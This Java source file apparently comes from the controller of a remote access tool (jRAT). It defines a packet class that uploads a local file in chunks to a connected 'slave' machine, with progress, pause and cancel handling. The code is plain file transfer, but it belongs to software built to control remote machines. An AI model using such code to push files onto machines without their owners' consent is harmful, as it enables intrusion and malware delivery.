package se.jrat.client.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;

import se.jrat.client.Slave;
import se.jrat.client.ui.panels.PanelFileTransfers;
import se.jrat.common.TransferRunnable;
import se.jrat.common.io.TransferData;


public class Packet42ServerUploadFile extends AbstractOutgoingPacket {

	private File file;
	private String remoteFile;
	
	public Packet42ServerUploadFile(File file, String remoteFile) {
		this.file = file;
		this.remoteFile = remoteFile;
	}

	@Override
	public void write(final Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(remoteFile);
		dos.writeLong(file.length());
		
		if (file.exists() && file.isFile()) {
			TransferData data = new TransferData();
			PanelFileTransfers.instance.add(data);
			data.setRemoteFile(remoteFile);
			data.setLocalFile(file);
			data.setTotal(file.length());
			data.setObject(slave);
			
			data.setRunnable(new TransferRunnable(data) {
				public void run() {
					try {							
						FileInputStream fileInput = new FileInputStream(file);
						byte[] chunk = new byte[1024 * 8];

						for (long pos = 0; pos < file.length(); pos += 1024 * 8) {
							if (pause) {
								try {
									Thread.sleep(Long.MAX_VALUE);
								} catch (InterruptedException e) {

								}
							}
							
							if (Thread.interrupted() || !slave.isConnected()) {
								fileInput.close();
								return;
							}

							int read = fileInput.read(chunk);
							
							slave.addToSendQueue(new Packet104ServerUploadPart(remoteFile, chunk, read));
														
							data.increaseRead(read);
							PanelFileTransfers.instance.update();
						}
						
						fileInput.close();
						
						data.setState(TransferData.State.COMPLETED);
						slave.addToSendQueue(new Packet103CompleteServerUpload(remoteFile));
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}
			});
			
			data.start();
		}
	}

	@Override
	public byte getPacketId() {
		return 42;
	}

}
